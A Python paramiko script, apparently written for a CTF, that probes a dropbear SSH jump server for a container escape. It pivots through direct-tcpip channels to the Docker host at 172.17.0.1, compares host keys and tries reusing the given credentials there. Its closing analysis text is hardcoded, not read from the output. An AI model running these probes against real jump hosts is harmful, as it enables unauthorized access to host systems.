import paramiko
import socket
import time
import sys
import threading

"""
核心分析：FakeJumpServer攻击

根据题目提示，需要利用SSH的某些特性。让我们分析一下：

1. ProxyJump (-J) 工作原理：
   - 客户端连接到跳板机
   - 客户端请求跳板机建立到目标的direct-tcpip通道
   - 客户端通过通道与目标进行SSH握手
   - 客户端向目标发送认证信息

2. FakeJumpServer攻击：
   - 恶意跳板机不连接到真正的目标，而是自己伪装成目标
   - 客户端以为在跟目标通信，实际上在跟跳板机通信
   - 跳板机可以窃取客户端发送的凭据

3. 在这个CTF中的应用：
   - 我们是"客户端"，想要逃逸
   - dropbear是跳板机，它会为每个direct-tcpip创建新容器
   - 172.17.0.1是真实宿主机
   
   问题是：dropbear如何处理到172.17.0.1的请求？
   - 它会创建一个到172.17.0.1的真实连接吗？
   - 还是它会伪造响应？

让我测试一下dropbear是否会修改我们到172.17.0.1的流量
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def analyze_host_key_behavior():
    """
    分析host key行为
    
    如果dropbear是"假的"跳板机，当我们请求连接到172.17.0.1时，
    它可能会返回自己的host key而不是真实的host key
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 直接连接时的host key
    direct_key = transport.get_remote_server_key()
    print(f"直接连接dropbear的host key: {direct_key.get_fingerprint().hex()}")
    
    # 通过通道连接到172.17.0.1时的host key
    channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
    target_transport = paramiko.Transport(channel)
    target_transport.start_client()
    
    target_key = target_transport.get_remote_server_key()
    print(f"通过通道连接172.17.0.1的host key: {target_key.get_fingerprint().hex()}")
    
    if direct_key.get_fingerprint() == target_key.get_fingerprint():
        print("\n[!] HOST KEY相同！")
        print("[!] dropbear可能在伪造172.17.0.1的响应！")
    else:
        print("\n[*] Host key不同")
        print("[*] dropbear正在转发到真实的172.17.0.1")
    
    target_transport.close()
    ssh.close()

def test_connection_info():
    """测试连接信息"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 检查SSH连接信息...")
    
    # 连接到127.0.0.1并检查从那边看到的连接信息
    channel = transport.open_channel("direct-tcpip", ("127.0.0.1", 22), ('192.168.1.1', 12345))
    target_transport = paramiko.Transport(channel)
    target_transport.start_client()
    target_transport.auth_password(USER, PASSWD)
    
    # 在新连接中检查SSH_CLIENT
    session = target_transport.open_session()
    session.get_pty()
    session.invoke_shell()
    
    time.sleep(0.5)
    if session.recv_ready():
        session.recv(4096)
    
    session.send("echo SSH_CLIENT=$SSH_CLIENT\n")
    time.sleep(0.5)
    result = session.recv(4096).decode()
    print(result)
    
    session.send("echo SSH_CONNECTION=$SSH_CONNECTION\n")
    time.sleep(0.5)
    result = session.recv(4096).decode()
    print(result)
    
    target_transport.close()
    ssh.close()

def test_forwarding_authentication():
    """
    测试转发认证
    
    当我们通过direct-tcpip到达新的SSH服务时，
    dropbear如何处理认证？
    
    如果dropbear是中间人，它可能：
    1. 窃取我们的凭据
    2. 使用窃取的凭据登录真实服务器
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试认证行为...")
    
    # 连接到127.0.0.1:22（也是dropbear）
    channel = transport.open_channel("direct-tcpip", ("127.0.0.1", 22), ('127.0.0.1', 0))
    target_transport = paramiko.Transport(channel)
    target_transport.start_client()
    
    # 尝试用错误的密码
    print("\n测试错误密码...")
    try:
        target_transport.auth_password(USER, "wrongpassword")
        print("[!] 错误密码认证成功 - 这很可疑!")
    except paramiko.AuthenticationException:
        print("[*] 错误密码被拒绝 - 正常")
    
    target_transport.close()
    
    # 再次连接，这次用正确的密码但不同的用户名
    channel = transport.open_channel("direct-tcpip", ("127.0.0.1", 22), ('127.0.0.1', 0))
    target_transport = paramiko.Transport(channel)
    target_transport.start_client()
    
    print("\n测试不同用户名...")
    try:
        target_transport.auth_password("differentuser", PASSWD)
        print("[!] 不同用户名认证成功 - 有趣!")
    except paramiko.AuthenticationException:
        print("[*] 不同用户名被拒绝 - 正常")
    
    target_transport.close()
    ssh.close()

def test_credential_forwarding():
    """
    测试凭据转发
    
    如果我们用某个凭据连接到跳板机，
    然后通过跳板机连接到其他地方，
    跳板机能否使用我们的凭据？
    """
    
    print("[*] 测试凭据转发行为...")
    print("""
    场景：
    1. 我们用 ctf/123456 连接到跳板机
    2. 通过跳板机请求连接到172.17.0.1
    3. 我们需要向172.17.0.1认证
    
    问题：
    - 跳板机能否"重用"我们的凭据去连接172.17.0.1？
    - 如果可以，我们就可以利用这个特性
    """)
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 连接到172.17.0.1并检查认证方法
    channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
    target_transport = paramiko.Transport(channel)
    target_transport.start_client()
    
    # 获取支持的认证方法
    try:
        target_transport.auth_none("test")
    except paramiko.BadAuthenticationType as e:
        print(f"172.17.0.1支持的认证方法: {e.allowed_types}")
    except Exception as e:
        print(f"错误: {e}")
    
    # 尝试用相同的凭据
    print("\n尝试用ctf/123456连接172.17.0.1...")
    try:
        target_transport.auth_password(USER, PASSWD)
        print("[+] 成功!")
    except paramiko.AuthenticationException:
        print("[-] 失败 - 172.17.0.1需要不同的凭据")
    
    target_transport.close()
    ssh.close()

def check_dropbear_forwarding_behavior():
    """
    检查dropbear的转发行为
    
    关键问题：当我们请求转发到某个地址时，
    dropbear是在容器内部发起连接还是在外部发起？
    """
    
    print("[*] 分析dropbear转发行为...")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 检查容器内的网络接口
    session = transport.open_session()
    session.exec_command("ip addr; ip route")
    network_info = session.recv(8192).decode()
    print(f"容器网络信息:\n{network_info}")
    
    # 如果容器没有网络接口但direct-tcpip能工作，
    # 说明转发是在容器外部处理的
    
    print("""
    分析：
    - 容器网络接口是DOWN状态
    - 但direct-tcpip到172.17.0.1可以工作
    - 这意味着dropbear在容器外部处理direct-tcpip请求
    - dropbear直接从宿主机网络发起连接
    
    这为什么重要？
    - 如果dropbear能访问宿主机网络，它就能访问宿主机的服务
    - 包括本地监听的服务、docker socket等
    """)
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] FakeJumpServer攻击分析")
    print("="*60)
    
    print("\n[1] 分析host key行为")
    analyze_host_key_behavior()
    
    print("\n[2] 测试连接信息")
    test_connection_info()
    
    print("\n[3] 测试转发认证")
    test_forwarding_authentication()
    
    print("\n[4] 测试凭据转发")
    test_credential_forwarding()
    
    print("\n[5] 检查转发行为")
    check_dropbear_forwarding_behavior()
